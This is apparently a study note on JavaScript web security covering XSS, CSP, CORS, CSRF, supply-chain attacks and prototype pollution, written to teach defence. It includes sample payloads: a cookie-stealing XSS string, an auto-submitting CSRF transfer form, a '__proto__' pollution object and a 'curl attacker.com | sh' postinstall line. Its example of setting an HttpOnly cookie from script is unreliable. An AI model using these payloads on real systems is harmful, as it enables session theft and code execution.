---
title: Security
phase: 10
topic: JavaScript Security
tags: [javascript, security, xss, csrf, csp, cors, sanitization, supply-chain]
created: 2025-01-15
---

# JavaScript Security

> [!info] **Big Picture**
> Client-side JavaScript runs in an **untrusted environment** — users can read, modify, and intercept everything. Security is about **defence in depth**: sanitise inputs, enforce policies (CSP, CORS), validate on the server, and treat every user input as hostile. The #1 rising threat in 2025 is **supply-chain attacks** via compromised npm packages.

---

## Cross-Site Scripting (XSS)

Injecting malicious scripts into pages viewed by other users.

### Types

| Type | Vector | Where it runs |
|------|--------|---------------|
| **Stored (Persistent)** | Saved to DB (comments, profiles) | Server renders the payload |
| **Reflected** | URL query params | Server reflects input back |
| **DOM-based** | Client-side JS reads URL/hash | Browser executes directly |

### Attack Example

```html
<!-- DOM-based XSS -->
<div id="output"></div>
<script>
  // ❌ VULNERABLE — reads hash and injects as HTML
  document.getElementById("output").innerHTML = location.hash.slice(1);
  // URL: page.html#<img src=x onerror=alert(document.cookie)>
</script>
```

### Prevention

```js
// ✅ Use textContent instead of innerHTML
element.textContent = userInput; // safe — no parsing

// ✅ Sanitise if HTML is required
import DOMPurify from "dompurify";
element.innerHTML = DOMPurify.sanitize(userInput);

// ✅ Use template literals safely
// Framework auto-escaping (React, Vue, Angular) handles this

// ✅ Encode for specific contexts
function escapeHTML(str) {
  const div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
}
```

> [!tip] **Framework Auto-Escaping**
> React's JSX escapes by default:
> ```jsx
> // Safe — React escapes the string
> <p>{userInput}</p>
>
> // ⚠️ DANGEROUS — bypasses escaping
> <p dangerouslySetInnerHTML={{ __html: userInput }} />
> ```

---

## Content Security Policy (CSP)

HTTP header that controls what resources a page can load.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

### Key Directives

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all resource types |
| `script-src` | JavaScript sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | XHR, fetch, WebSocket endpoints |
| `frame-ancestors` | Who can embed (replaces X-Frame-Options) |
| `base-uri` | Restricts `<base>` tag |

### Nonce-Based CSP (Recommended)

```html
<!-- Server generates a unique nonce per request -->
<script nonce="abc123">
  // This script is allowed
</script>

<!-- Inline scripts without the nonce are blocked -->
<script>alert("blocked")</script>
```

### Meta Tag (Fallback)

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

---

## Cross-Origin Resource Sharing (CORS)

Browser mechanism that blocks cross-origin requests by default.

```
Origin: https://myapp.com
Request → https://api.other.com  ← BLOCKED unless CORS headers present
```

### Server-Side Headers

```http
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### Preflight Request

For non-simple requests (PUT, DELETE, custom headers), the browser sends an `OPTIONS` request first:

```
1. Browser → OPTIONS /api/data (preflight)
2. Server → 200 + CORS headers
3. Browser → PUT /api/data (actual request)
```

### Common Fix (Express)

```js
import cors from "cors";

app.use(cors({
  origin: "https://myapp.com",      // ❌ Don't use "*" with credentials
  methods: ["GET", "POST", "PUT"],
  credentials: true
}));
```

> [!warning] **Never Use `Access-Control-Allow-Origin: *` with Credentials**
> The browser will reject the response. Specify the exact origin instead.

---

## Cross-Site Request Forgery (CSRF)

Tricks authenticated users into making unintended requests.

### Attack

```html
<!-- On attacker's site — the user's cookies are sent automatically -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById("f").submit();</script>
```

### Prevention

```js
// 1. CSRF Tokens — unique per session, validated server-side
// Server embeds token in form
<input type="hidden" name="_csrf" value="token123">

// Client sends token with API calls
fetch("/api/transfer", {
  method: "POST",
  headers: {
    "X-CSRF-Token": csrfToken   // custom header
  }
});

// 2. SameSite Cookies (primary defence in 2025)
// Set on the server:
Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly
```

### SameSite Cookie Values

| Value | Cross-site requests | Notes |
|-------|---------------------|-------|
| `Strict` | Never sent | Safest, but breaks links from external sites |
| `Lax` | Sent on top-level navigation (GET only) | **Default** in modern browsers |
| `None` | Always sent | Requires `Secure` flag (HTTPS) |

---

## Supply-Chain Attacks

> [!danger] **#1 Concern in 2025**
> Compromised npm packages can run arbitrary code at install time or runtime. The **Polyfill.io** breach (2024) affected 100K+ websites.

### Attack Vectors

1. **Typosquatting** — `lodash` vs `1odash`
2. **Maintainer account takeover** — Compromised npm credentials
3. **Malicious install scripts** — `"postinstall": "curl attacker.com | sh"`
4. **Dependency confusion** — Public package name matches internal package

### Prevention

```bash
# 1. Audit dependencies regularly
npm audit
pnpm audit

# 2. Use lockfiles — install exact versions
npm ci                    # in CI/CD — uses package-lock.json exactly

# 3. Limit install scripts
npm install --ignore-scripts
# Then manually review and run needed scripts

# 4. Use --dry-run to preview
npm install some-package --dry-run

# 5. Pin versions
# package.json
"dependencies": {
  "express": "4.18.2"      // exact version, no ^ or ~
}
```

```bash
# 6. Use Socket.dev or Snyk for real-time monitoring
npm install -g socket      # https://socket.dev
```

---

## Prototype Pollution

Modifying `Object.prototype` to inject properties into all objects.

```js
// ❌ VULNERABLE — recursive merge without checks
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object") {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Attack payload
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

console.log({}.isAdmin); // true — ALL objects are polluted
```

### Prevention

```js
// ✅ Block dangerous keys
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
      continue; // skip dangerous keys
    }
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ✅ Use Object.create(null) for dictionaries
const config = Object.create(null); // no prototype at all

// ✅ Use Map instead of plain objects
const settings = new Map();

// ✅ Freeze the prototype
Object.freeze(Object.prototype);
```

---

## Secure Coding Practices

### 1. Never Trust Client Input

```js
// ❌ Client-side validation alone
if (form.age.value > 18) { proceed(); }

// ✅ Client validates for UX, server validates for SECURITY
// Server:
if (!Number.isInteger(age) || age < 0 || age > 150) {
  throw new Error("Invalid age");
}
```

### 2. Never Embed Secrets in Client Code

```js
// ❌ Visible to anyone who opens DevTools
const API_KEY = "sk-abc123secret";

// ✅ Use a backend proxy
// Client → Your Server (has secrets) → Third-party API
```

### 3. Use HTTPS Everywhere

```js
// ✅ Secure cookies
document.cookie = "session=abc; Secure; HttpOnly; SameSite=Lax";

// ✅ Mixed content is blocked by modern browsers
// HTTP resources on HTTPS pages are blocked
```

### 4. Avoid Dangerous APIs

```js
// ❌ Avoid eval and friends
eval(userInput);                        // code injection
new Function("return " + userInput)();  // code injection
setTimeout(userInput, 1000);            // string form executes code
element.innerHTML = userInput;          // XSS

// ✅ Safer alternatives
JSON.parse(userInput);                  // for JSON
element.textContent = userInput;        // for text
setTimeout(() => safeFunction(), 1000); // function form
```

### 5. Safe URL Handling

```js
// ❌ Open redirect
window.location = userInput;

// ✅ Validate URLs
function isSafeRedirect(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return parsed.origin === window.location.origin; // same-origin only
  } catch {
    return false;
  }
}

// ✅ Sanitise href for javascript: protocol
function safeHref(url) {
  const parsed = new URL(url, window.location.origin);
  if (parsed.protocol === "javascript:") return "#";
  return url;
}
```

### 6. Subresource Integrity (SRI)

```html
<!-- Verify CDN scripts haven't been tampered with -->
<script 
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

---

## Security Checklist

| Category | Action | Priority |
|----------|--------|----------|
| **XSS** | Use `textContent`, auto-escaping frameworks, DOMPurify | Critical |
| **CSP** | Deploy nonce-based CSP headers | High |
| **CSRF** | SameSite cookies + CSRF tokens for mutations | High |
| **CORS** | Whitelist specific origins, never `*` + credentials | High |
| **Supply chain** | Audit deps, lockfiles, pin versions | Critical |
| **Secrets** | Never in client code, use env vars + proxy | Critical |
| **HTTPS** | All resources over HTTPS, HSTS header | Critical |
| **Cookies** | `Secure`, `HttpOnly`, `SameSite=Lax` | High |
| **Input** | Validate server-side, sanitise for context | Critical |
| **eval** | Never with user input | Critical |

---

## Related Topics

- [[09 - Fetch API and Network Requests]] — CORS in practice
- [[08 - Browser Data Storage]] — Secure cookie/storage usage
- [[03 - Node.js Fundamentals]] — Server-side security
- [[04 - Proxy and Reflect]] — Prototype pollution defence

---

**Navigation:**
← [[04 - Build Tools and Modern Ecosystem]] | [[06 - Web Components and Web Workers]] →
